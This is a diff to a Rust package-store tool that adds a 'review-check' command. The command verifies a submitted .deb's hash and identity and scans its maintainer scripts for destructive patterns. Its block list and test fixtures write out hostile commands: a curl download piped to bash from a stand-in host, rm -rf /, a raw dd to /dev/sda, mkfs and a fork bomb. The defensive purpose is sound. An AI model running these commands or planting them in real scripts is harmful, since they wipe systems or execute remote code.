@@ -214,6 +214,24 @@ enum Cmd {
         #[arg(long)]
         dry_run: bool,
     },
+    /// Store pre-review checks on a submitted .deb: submission hash binding,
+    /// package identity, safe names, and maintainer-script heuristics.
+    /// Store-side tooling; see docs/STORE_REVIEW_MODEL.md.
+    /// Exit 0 pass, 2 check failure, 4 usage error.
+    ReviewCheck {
+        /// Path to the submitted .deb
+        #[arg(long)]
+        deb: PathBuf,
+        /// SHA-256 the submission binds (64 lowercase hex)
+        #[arg(long)]
+        sha256: String,
+        /// Package name the submission declares
+        #[arg(long)]
+        name: String,
+        /// Version the submission declares; exact match required when given
+        #[arg(long)]
+        version: Option<String>,
+    },
 }
 
 fn now_secs() -> u64 {
@@ -1346,6 +1364,12 @@ fn main() -> ExitCode {
             private_key,
             out,
         } => cmd_sign(allowlist, private_key, out),
+        Cmd::ReviewCheck {
+            deb,
+            sha256,
+            name,
+            version,
+        } => cmd_review_check(deb, sha256, name, version),
         Cmd::Keygen { out } => cmd_keygen(out),
         Cmd::Audit { action } => cmd_audit(action),
         Cmd::Update {
@@ -2189,5 +2213,434 @@ mod url_transport_tests {
         assert!(http.get(&base, 1024).is_err());
         // A plain 200 body is returned.
         assert_eq!(http.get(&base, 1024).unwrap(), b"hello");
+    }
+}
+
+/// One maintainer-script finding. Findings name the pattern and the line
+/// number, never the script content (log hygiene, docs/THREAT_MODEL.md).
+#[derive(Debug)]
+struct ScriptFinding {
+    script: String,
+    line: usize,
+    fail: bool,
+    pattern: &'static str,
+}
+
+/// What a pre-review check established.
+#[derive(Debug)]
+struct ReviewReport {
+    package: String,
+    version: String,
+    scripts_scanned: usize,
+    findings: Vec<ScriptFinding>,
+}
+
+/// True when a compacted (whitespace-free) line pipes into a shell. The match
+/// must end at a non-letter boundary so `| sha256sum -c` is not a pipe to sh.
+fn piped_to_shell(compact: &str) -> bool {
+    for pat in ["|sh", "|bash", "|zsh", "|dash", "|/bin/sh", "|/bin/bash"] {
+        let mut start = 0;
+        while let Some(i) = compact[start..].find(pat) {
+            let after = start + i + pat.len();
+            match compact.as_bytes().get(after) {
+                None => return true,
+                Some(b) if !b.is_ascii_alphanumeric() => return true,
+                _ => {}
+            }
+            start = after;
+        }
+    }
+    false
+}
+
+/// True when a compacted line runs `rm` with recursive+force flags rooted at
+/// / (end of line, glob, or command separator right after the slash).
+fn has_root_rm(compact: &str) -> bool {
+    for pat in [
+        "rm-rf/",
+        "rm-fr/",
+        "rm-r-f/",
+        "rm-f-r/",
+        "rm--recursive--force/",
+    ] {
+        let mut start = 0;
+        while let Some(i) = compact[start..].find(pat) {
+            let after = start + i + pat.len();
+            match compact.as_bytes().get(after) {
+                None => return true,
+                Some(b) if b"*|;&)\"\'`".contains(b) => return true,
+                _ => {}
+            }
+            start = after;
+        }
+    }
+    false
+}
+
+/// True when a compacted line chmods / recursively world-writable.
+fn has_root_chmod(compact: &str) -> bool {
+    for pat in ["chmod-R777/", "chmod-Rf777/", "chmod-fR777/"] {
+        let mut start = 0;
+        while let Some(i) = compact[start..].find(pat) {
+            let after = start + i + pat.len();
+            match compact.as_bytes().get(after) {
+                None => return true,
+                Some(b) if b"*;&)\"\'`".contains(b) => return true,
+                _ => {}
+            }
+            start = after;
+        }
+    }
+    false
+}
+
+/// Heuristic scan of one maintainer script. FAIL findings are install-time
+/// code-execution red flags: a download piped to a shell, recursive delete or
+/// world-writable chmod rooted at /, raw writes to block devices, mkfs, fork
+/// bombs. WARN findings deserve a human look: network fetches, remote URLs,
+/// sudo in a script that already runs as root. These are heuristics, not
+/// detection: a clean scan says nothing about what the installed binary does
+/// at runtime. See docs/STORE_REVIEW_MODEL.md section 5.
+fn scan_script(name: &str, body: &[u8]) -> Result<Vec<ScriptFinding>, String> {
+    let text = std::str::from_utf8(body)
+        .map_err(|_| format!("maintainer script {name} is not valid UTF-8 text"))?;
+    let mut out = Vec::new();
+    let mut finding = |line: usize, fail: bool, pattern: &'static str| {
+        out.push(ScriptFinding {
+            script: name.to_string(),
+            line,
+            fail,
+            pattern,
+        });
+    };
+    for (idx, line) in text.lines().enumerate() {
+        let n = idx + 1;
+        let compact: String = line.chars().filter(|c| !c.is_whitespace()).collect();
+        let fetches = line.contains("curl") || line.contains("wget") || compact.contains("base64");
+        if fetches && piped_to_shell(&compact) {
+            finding(n, true, "download piped to a shell");
+        }
+        if has_root_rm(&compact) {
+            finding(n, true, "recursive forced delete rooted at /");
+        }
+        if compact.contains("of=/dev/") {
+            finding(n, true, "raw write to a block device");
+        }
+        if compact.contains("mkfs") {
+            finding(n, true, "filesystem format command");
+        }
+        if compact.contains(":(){") {
+            finding(n, true, "fork bomb");
+        }
+        if has_root_chmod(&compact) {
+            finding(n, true, "recursive world-writable chmod rooted at /");
+        }
+        if line.contains("curl") || line.contains("wget") {
+            finding(n, false, "network fetch in a maintainer script");
+        } else if line.contains("http://") || line.contains("https://") {
+            finding(n, false, "remote URL in a maintainer script");
+        }
+        if compact.starts_with("sudo") || compact.contains(";sudo") || compact.contains("|sudo") {
+            finding(n, false, "sudo in a script that already runs as root");
+        }
+    }
+    Ok(out)
+}
+
+/// The pure core of `review-check`, over the .deb's bytes. Err is a review
+/// failure (hash mismatch, identity mismatch, unreadable or unsafe package);
+/// Ok carries the identity and any maintainer-script findings, and any FAIL
+/// finding fails the review.
+fn run_review_check(
+    deb: &[u8],
+    expected_sha256: &str,
+    name: &str,
+    version: Option<&str>,
+) -> Result<ReviewReport, String> {
+    pos_gate::names::validate_package_name(name)
+        .map_err(|e| format!("package name fails the gate's safe-name rules: {e}"))?;
+    if let Some(v) = version {
+        if v.is_empty() || v.bytes().any(|b| b.is_ascii_control() || b == b' ') {
+            return Err(
+                "version is empty or contains whitespace or control characters".to_string(),
+            );
+        }
+    }
+    if expected_sha256.len() != 64
+        || !expected_sha256
+            .bytes()
+            .all(|b| b.is_ascii_hexdigit() && !b.is_ascii_uppercase())
+    {
+        return Err("submission hash must be 64 lowercase hex characters".to_string());
+    }
+    use sha2::Digest as _;
+    let actual_hex = hex::encode(sha2::Sha256::digest(deb));
+    if actual_hex != expected_sha256 {
+        return Err(format!(
+            "hash mismatch: the submission binds {expected_sha256} but the file is {actual_hex}"
+        ));
+    }
+    let contents = pos_gate::deb_identity::read_control_contents(&mut std::io::Cursor::new(deb))
+        .map_err(|e| format!("cannot read the package's control archive: {e}"))?;
+    pos_gate::deb_identity::check_identity(&contents.identity, name, version)
+        .map_err(|e| format!("package identity mismatch: {e}"))?;
+    let mut findings = Vec::new();
+    for script in &contents.scripts {
+        findings.extend(scan_script(&script.name, &script.body)?);
+    }
+    Ok(ReviewReport {
+        package: contents.identity.package,
+        version: contents.identity.version,
+        scripts_scanned: contents.scripts.len(),
+        findings,
+    })
+}
+
+fn cmd_review_check(
+    deb: PathBuf,
+    sha256: String,
+    name: String,
+    version: Option<String>,
+) -> ExitCode {
+    let bytes = match std::fs::read(&deb) {
+        Ok(b) => b,
+        Err(e) => {
+            eprintln!("error: cannot read {}: {e}", deb.display());
+            return ExitCode::from(4);
+        }
+    };
+    match run_review_check(&bytes, &sha256, &name, version.as_deref()) {
+        Err(msg) => {
+            eprintln!("review-check FAILED: {msg}");
+            ExitCode::from(2)
+        }
+        Ok(report) => {
+            println!(
+                "package {} {}: hash bound, identity matches, {} maintainer script(s) scanned",
+                report.package, report.version, report.scripts_scanned
+            );
+            let mut failed = false;
+            for f in &report.findings {
+                let level = if f.fail { "FAIL" } else { "WARN" };
+                println!("{level}: {} line {}: {}", f.script, f.line, f.pattern);
+                failed |= f.fail;
+            }
+            if failed {
+                eprintln!("review-check FAILED: maintainer-script findings above");
+                ExitCode::from(2)
+            } else {
+                println!("review-check passed");
+                ExitCode::SUCCESS
+            }
+        }
+    }
+}
+
+#[cfg(test)]
+mod review_check_tests {
+    use super::*;
+
+    /// A minimal .deb whose control archive carries the given maintainer
+    /// scripts. Test fixture builder, modeled on build_minimal_deb.
+    fn build_deb_with_scripts(package: &str, version: &str, scripts: &[(&str, &str)]) -> Vec<u8> {
+        fn tar_header(name: &str, size: usize) -> [u8; 512] {
+            let mut h = [0u8; 512];
+            h[..name.len()].copy_from_slice(name.as_bytes());
+            h[100..108].copy_from_slice(b"0000644\0");
+            h[124..136].copy_from_slice(format!("{:011o}\0", size).as_bytes());
+            h[156] = b'0';
+            h
+        }
+        let control = format!("Package: {package}\nVersion: {version}\nArchitecture: all\n");
+        let mut tar = Vec::new();
+        let push = |tar: &mut Vec<u8>, name: &str, data: &[u8]| {
+            tar.extend_from_slice(&tar_header(name, data.len()));
+            tar.extend_from_slice(data);
+            tar.resize(tar.len().div_ceil(512) * 512, 0);
+        };
+        push(&mut tar, "./control", control.as_bytes());
+        for (n, body) in scripts {
+            push(&mut tar, &format!("./{n}"), body.as_bytes());
+        }
+        tar.resize(tar.len() + 1024, 0);
+        let member = |name: &str, data: &[u8]| {
+            let mut v = format!(
+                "{:<16}{:<12}{:<6}{:<6}{:<8}{:<10}`\n",
+                format!("{name}/"),
+                0,
+                0,
+                0,
+                "100644",
+                data.len()
+            )
+            .into_bytes();
+            v.extend_from_slice(data);
+            if data.len() % 2 == 1 {
+                v.push(b'\n');
+            }
+            v
+        };
+        let mut deb = b"!<arch>\n".to_vec();
+        deb.extend(member("debian-binary", b"2.0\n"));
+        deb.extend(member("control.tar", &tar));
+        deb.extend(member("data.tar.xz", b"placeholder"));
+        deb
+    }
+
+    fn sha256_hex(bytes: &[u8]) -> String {
+        use sha2::Digest as _;
+        hex::encode(sha2::Sha256::digest(bytes))
+    }
+
+    #[test]
+    fn clean_package_passes() {
+        let deb = build_deb_with_scripts(
+            "hello-app",
+            "1.0",
+            &[("postinst", "#!/bin/sh\nset -e\nldconfig\n")],
+        );
+        let r = run_review_check(&deb, &sha256_hex(&deb), "hello-app", Some("1.0")).unwrap();
+        assert_eq!(r.package, "hello-app");
+        assert_eq!(r.scripts_scanned, 1);
+        assert!(r.findings.is_empty());
+    }
+
+    #[test]
+    fn hash_mismatch_fails() {
+        let deb = build_deb_with_scripts("hello-app", "1.0", &[]);
+        let other = build_deb_with_scripts("hello-app", "1.1", &[]);
+        let err =
+            run_review_check(&deb, &sha256_hex(&other), "hello-app", Some("1.0")).unwrap_err();
+        assert!(err.contains("hash mismatch"));
+    }
+
+    #[test]
+    fn identity_and_name_rule_failures() {
+        let deb = build_deb_with_scripts("hello-app", "1.0", &[]);
+        let h = sha256_hex(&deb);
+        assert!(run_review_check(&deb, &h, "other-app", Some("1.0")).is_err());
+        assert!(run_review_check(&deb, &h, "hello-app", Some("2.0")).is_err());
+        assert!(run_review_check(&deb, &h, "bad;name", None).is_err());
+        assert!(run_review_check(&deb, "zz", "hello-app", None).is_err());
+    }
+
+    #[test]
+    fn pipe_to_shell_fails_but_checksum_pipe_does_not() {
+        let evil = build_deb_with_scripts(
+            "evil-app",
+            "1.0",
+            &[(
+                "postinst",
+                "#!/bin/sh\ncurl https://x.example/p.sh | bash\n",
+            )],
+        );
+        let r = run_review_check(&evil, &sha256_hex(&evil), "evil-app", None).unwrap();
+        assert!(r.findings.iter().any(|f| f.fail));
+
+        let careful = build_deb_with_scripts(
+            "careful-app",
+            "1.0",
+            &[(
+                "postinst",
+                "#!/bin/sh\ncurl -O https://x.example/sums\nsha256sum -c sums\n",
+            )],
+        );
+        let r = run_review_check(&careful, &sha256_hex(&careful), "careful-app", None).unwrap();
+        assert!(!r.findings.iter().any(|f| f.fail));
+        assert!(r.findings.iter().any(|f| !f.fail)); // the fetch itself warns
+    }
+
+    #[test]
+    fn destructive_patterns_fail() {
+        for (label, body) in [
+            ("rm-root", "#!/bin/sh\nrm -rf / \n"),
+            ("rm-root-star", "#!/bin/sh\nrm -rf /*\n"),
+            ("rm-subdir-ok-but-dd", "#!/bin/sh\ndd if=x of=/dev/sda\n"),
+            ("mkfs", "#!/bin/sh\nmkfs.ext4 /dev/sda1\n"),
+            ("forkbomb", "#!/bin/sh\n:(){ :|:& };:\n"),
+            ("chmod", "#!/bin/sh\nchmod -R 777 / \n"),
+        ] {
+            let deb = build_deb_with_scripts("bad-app", "1.0", &[("postinst", body)]);
+            let r = run_review_check(&deb, &sha256_hex(&deb), "bad-app", None)
+                .unwrap_or_else(|e| panic!("{label}: unexpected Err: {e}"));
+            assert!(r.findings.iter().any(|f| f.fail), "{label}");
+        }
+        // A recursive delete of a real subdirectory is fine.
+        let ok = build_deb_with_scripts(
+            "ok-app",
+            "1.0",
+            &[("prerm", "#!/bin/sh\nrm -rf /var/lib/ok-app\n")],
+        );
+        let r = run_review_check(&ok, &sha256_hex(&ok), "ok-app", None).unwrap();
+        assert!(!r.findings.iter().any(|f| f.fail));
+    }
+
+    #[test]
+    fn non_utf8_script_fails() {
+        let deb =
+            build_deb_with_scripts_raw("bin-app", "1.0", &[("postinst", &[0xff, 0xfe, 0x41])]);
+        let err = run_review_check(&deb, &sha256_hex(&deb), "bin-app", None).unwrap_err();
+        assert!(err.contains("UTF-8"));
+    }
+
+    fn build_deb_with_scripts_raw(
+        package: &str,
+        version: &str,
+        scripts: &[(&str, &[u8])],
+    ) -> Vec<u8> {
+        fn tar_header(name: &str, size: usize) -> [u8; 512] {
+            let mut h = [0u8; 512];
+            h[..name.len()].copy_from_slice(name.as_bytes());
+            h[100..108].copy_from_slice(b"0000644\0");
+            h[124..136].copy_from_slice(format!("{:011o}\0", size).as_bytes());
+            h[156] = b'0';
+            h
+        }
+        let control = format!("Package: {package}\nVersion: {version}\nArchitecture: all\n");
+        let mut tar = Vec::new();
+        let push = |tar: &mut Vec<u8>, name: &str, data: &[u8]| {
+            tar.extend_from_slice(&tar_header(name, data.len()));
+            tar.extend_from_slice(data);
+            tar.resize(tar.len().div_ceil(512) * 512, 0);
+        };
+        push(&mut tar, "./control", control.as_bytes());
+        for (n, body) in scripts {
+            push(&mut tar, &format!("./{n}"), body);
+        }
+        tar.resize(tar.len() + 1024, 0);
+        let member = |name: &str, data: &[u8]| {
+            let mut v = format!(
+                "{:<16}{:<12}{:<6}{:<6}{:<8}{:<10}`\n",
+                format!("{name}/"),
+                0,
+                0,
+                0,
+                "100644",
+                data.len()
+            )
+            .into_bytes();
+            v.extend_from_slice(data);
+            if data.len() % 2 == 1 {
+                v.push(b'\n');
+            }
+            v
+        };
+        let mut deb = b"!<arch>\n".to_vec();
+        deb.extend(member("debian-binary", b"2.0\n"));
+        deb.extend(member("control.tar", &tar));
+        deb.extend(member("data.tar.xz", b"placeholder"));
+        deb
+    }
+
+    #[test]
+    fn duplicate_script_first_wins_and_sudo_warns() {
+        let deb = build_deb_with_scripts(
+            "sudo-app",
+            "1.0",
+            &[("preinst", "#!/bin/sh\nsudo -u x true\n")],
+        );
+        let r = run_review_check(&deb, &sha256_hex(&deb), "sudo-app", None).unwrap();
+        assert!(r.findings.iter().all(|f| !f.fail));
+        assert_eq!(r.scripts_scanned, 1);
     }
 }
